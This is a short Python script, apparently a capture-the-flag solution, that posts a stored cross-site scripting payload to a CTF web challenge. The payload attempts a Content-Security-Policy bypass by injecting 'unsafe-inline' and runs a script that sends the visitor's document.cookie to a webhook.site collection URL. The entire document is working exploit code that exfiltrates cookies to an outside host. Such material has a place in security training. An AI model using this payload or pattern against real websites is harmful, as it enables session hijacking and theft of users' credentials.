import requests
import urllib.parse

url = "http://csp1.sg.ctf.so"
payload = '<img src="http://x; script-src \'unsafe-inline\'"><script>location.href="https://webhook.site/9fe30dfd-04f9-4e10-9db0-d02cf0525d98/?c="+encodeURIComponent(document.cookie)</script>'
mydata = {
    "content": payload
}

r = requests.post(f"{url}/write", data=mydata)
print(r.url)